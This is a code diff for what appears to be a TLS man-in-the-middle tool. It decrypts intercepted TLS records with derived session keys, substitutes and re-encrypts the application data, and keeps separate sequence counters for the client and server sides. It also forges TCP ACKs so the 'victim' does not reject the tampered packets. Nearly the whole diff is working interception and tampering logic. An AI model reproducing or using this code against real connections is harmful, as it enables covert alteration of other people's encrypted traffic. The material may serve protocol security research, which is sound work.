@@ -23,6 +23,38 @@ class TASKSTATE(Enum):
     PASS = 7
     BLOCK = 8
 
+"""
+class SeqAckRecorder:
+    seq ack <-> seq ack [mitm] seq ack <-> seq ack
+    mitm should maintain two different seq & ack.
+    def __init__()
+"""
+
+class SeqGenerator:
+    def __init__(self):
+        self.CLIENT_SEQUENCE_NUM = 0
+        self.SERVER_SEQUENCE_NUM = 0
+
+    @property
+    def client_seq(self):
+        return self.CLIENT_SEQUENCE_NUM
+
+    @property
+    def server_seq(self):
+        return self.SERVER_SEQUENCE_NUM
+
+    @property
+    def client_and_increase(self):
+        result = self.CLIENT_SEQUENCE_NUM
+        self.CLIENT_SEQUENCE_NUM += 1
+        return result
+
+    @property
+    def server_and_increase(self):
+        result = self.SERVER_SEQUENCE_NUM
+        self.SERVER_SEQUENCE_NUM += 1
+        return result
+
 class KeyGenerator:
     def __init__(self):
         self.ready_lock = Lock()
@@ -71,11 +103,11 @@ class PktHandler:
         self.client_handshake_bytes = bytearray()
         self.server_handshake_bytes = bytearray()
         self.is_key_generated = False 
-        self.SEQUENCE_NUM = 0
         self.PROTO_VERSION = None
         self.STATE = "HANDSHAKE"
         self.isdhe = False
         self.seq_records = list()
+        self.SEQGEN = SeqGenerator()
         self.MODIFIED_TLS_DHE = b""
         self.MODIFIED_TCP = b""
         self.CIPHER_DECRYPTORS = {
@@ -130,10 +162,10 @@ class PktHandler:
     def encrypt_null(self):
         return b""
         
-    def decrypt_aes_gcm(self, ct_record, key, iv):
+    def decrypt_aes_gcm(self, ct_record, key, iv, seq):
         # RFC 5246: 6.2.3.3.
         # additional data: 8 (seq_num) + 1 (packet_type) + 2 (proto_version) + 2 (length).
-        seq_num = self.SEQUENCE_NUM.to_bytes(8, "big") # seq_num is 64 bit long.
+        seq_num = seq.to_bytes(8, "big") # seq_num is 64 bit long.
 
         packet_type = ct_record[0:1] 
         proto_version = ct_record[1:3]
@@ -157,29 +189,33 @@ class PktHandler:
         logging.debug("aad:" + aad.hex() + "len:" + str(len(aad)))
         return aesgcm.decrypt(nonce, ct, aad)
 
-    def decrypt_chacha_poly_dhe(self, ct_record, from_client):
+    def decrypt_chacha_poly_dhe(self, ct_record, from_client, seq = None):
         if from_client:
             key = self.CLIENT_DERIVE_KEYS["client_write_key"]
             iv = self.CLIENT_DERIVE_KEYS["client_iv"]
+            seq = self.SEQGEN.client_seq
         else:
             key = self.SERVER_DERIVE_KEYS["server_write_key"]
             iv = self.SERVER_DERIVE_KEYS["server_iv"]
+            seq = self.SEQGEN.server_seq
 
-        return self.decrypt_chacha_poly(ct_record, key, iv)
+        return self.decrypt_chacha_poly(ct_record, key, iv, seq)
 
     def encrypt_chacha_poly_dhe(self, header: bytes, plaintext: bytes, to_client: bool) -> bytes:
         if to_client:
             key = self.CLIENT_DERIVE_KEYS["server_write_key"]
             iv = self.CLIENT_DERIVE_KEYS["server_iv"]
+            seq = self.SEQGEN.server_and_increase
         else:
             key = self.SERVER_DERIVE_KEYS["client_write_key"]
             iv = self.SERVER_DERIVE_KEYS["client_iv"]
+            seq = self.SEQGEN.client_and_increase
 
-        return self.encrypt_chacha_poly(header, plaintext, key, iv)
+        return self.encrypt_chacha_poly(header, plaintext, key, iv, seq)
 
-    def encrypt_chacha_poly(self, header: bytes, plaintext: bytes, key: bytes, iv: bytes) -> bytes:
-        seq_num = self.SEQUENCE_NUM.to_bytes(8, "big")
-        padded_seq = self.SEQUENCE_NUM.to_bytes(12, "big")
+    def encrypt_chacha_poly(self, header: bytes, plaintext: bytes, key: bytes, iv: bytes, seq: int) -> bytes:
+        seq_num = seq.to_bytes(8, "big")
+        padded_seq = seq.to_bytes(12, "big")
         aad = b"".join([seq_num, header])
         nonce = bytes([_a ^ _b for _a, _b in zip(iv, padded_seq)])
 
@@ -191,10 +227,10 @@ class PktHandler:
         logging.debug("aad:" + aad.hex() + "len:" + str(len(aad)))
         return chacha.encrypt(nonce, plaintext, aad)
 
-    def decrypt_chacha_poly(self, ct_record, key, iv):
+    def decrypt_chacha_poly(self, ct_record: bytes, key: bytes, iv: bytes, seq: int) -> bytes:
         # RFC 5246: 6.2.3.3.
         # additional data: 8 (seq_num) + 1 (packet_type) + 2 (proto_version) + 2 (length).
-        seq_num = self.SEQUENCE_NUM.to_bytes(8, "big") # seq_num is 64 bit long.
+        seq_num = seq.to_bytes(8, "big") # seq_num is 64 bit long.
 
         packet_type = ct_record[0:1] 
         proto_version = ct_record[1:3]
@@ -209,7 +245,7 @@ class PktHandler:
 
         # additional data.
         aad = b"".join([seq_num, packet_type, proto_version, length]) 
-        padded_seq = self.SEQUENCE_NUM.to_bytes(12, "big")
+        padded_seq = seq.to_bytes(12, "big")
         nonce = bytes([_a ^ _b for _a, _b in zip(iv, padded_seq)])
 
         chacha = ChaCha20Poly1305(key)
@@ -318,7 +354,7 @@ class PktHandler:
 
         if self.isdhe:
             self.MASTER_KEY = self.CLIENT_MASTER_KEY
-        plain_text = self.CIPHER_DECRYPTORS[self.CIPHER_SUITE.name](finished_record, True)
+        plain_text = self.CIPHER_DECRYPTORS[self.CIPHER_SUITE.name](finished_record, True, self.SEQGEN.client_seq)
 
         # verify data length for CTR_OMAC cipher suites is 32, CNT_IMIT is 12, so 1 byte is enough to represent all the conditions.
         verifydata_length = plain_text[3]
@@ -376,7 +412,7 @@ class PktHandler:
         digest = digest.finalize()
 
         self.DERIVE_KEYS = self.SERVER_DERIVE_KEYS
-        plain_text = self.CIPHER_DECRYPTORS[self.CIPHER_SUITE.name](finished_record, False)
+        plain_text = self.CIPHER_DECRYPTORS[self.CIPHER_SUITE.name](finished_record, False, self.SEQGEN.server_seq)
 
         # verify data length for CTR_OMAC cipher suites is 32, CNT_IMIT is 12, so 1 byte is enough to represent all the conditions.
         verifydata_length = plain_text[3]
@@ -443,13 +479,11 @@ class PktHandler:
             self.handshake_bytes.extend(record.data)
 
     # Return (packet status, is dhe) pair.
-    def handle_packet(self, tls_data, data, seq) -> (int, bool):
-        self.SEQUENCE_NUM = seq
+    def handle_packet(self, data) -> (int, bool):
         tcp = dpkt.tcp.TCP(data) 
 
         if tcp.seq in self.visited:
             if self.isdhe:
-                logging.debug("block ")
                 return (TASKSTATE.BLOCK.value, self.isdhe)
             else:
                 return (TASKSTATE.PASS.value, self.isdhe)
@@ -492,7 +526,7 @@ class PktHandler:
                 plain_text = self.CIPHER_DECRYPTORS[self.CIPHER_SUITE.name](ct_record, tcp.sport)
             logging.info("plain text:" + plain_text.hex())
 
-            plaintext = b"ping"
+            plaintext = b"ping\n"
             header = b"".join([b"\x17\x03\x03", len(plaintext).to_bytes(2, "big")])
 
             # do not use dport.
@@ -500,16 +534,18 @@ class PktHandler:
 
             self.MODIFIED_TLS_DHE = self.MODIFIED_TLS_DHE.join([b"\x17\x03\x03", len(tampered_data).to_bytes(2, "big"), tampered_data]) 
 
-            # transmit ACK back directly, and block the return ack from the other side.
             """
+            transmit ACK back directly, and block the return ack from the other side.
+            reason: ack number sent must matches the seq num of the other side in the next round of TCP communication,
+            if we tamper the content of the TLS packet, victim will send the bad ack num back and the sender will reject the packet.
+            """
+
             tcp.sport, tcp.dport = tcp.dport, tcp.sport
-            tcp.seq = tcp.ack
-            tcp.ack = tcp.seq + len(bytes(tcp.data))
+            tcp.seq, tcp.ack = tcp.ack, tcp.seq + len(bytes(tcp.data)) + 1
             tcp.flags = dpkt.tcp.TH_ACK
             tcp.data = b""
             self.visited.add(tcp.seq)
             self.MODIFIED_TCP = bytes(tcp)
-            """
 
             return (TASKSTATE.COMMUNICATION.value, self.isdhe)
 
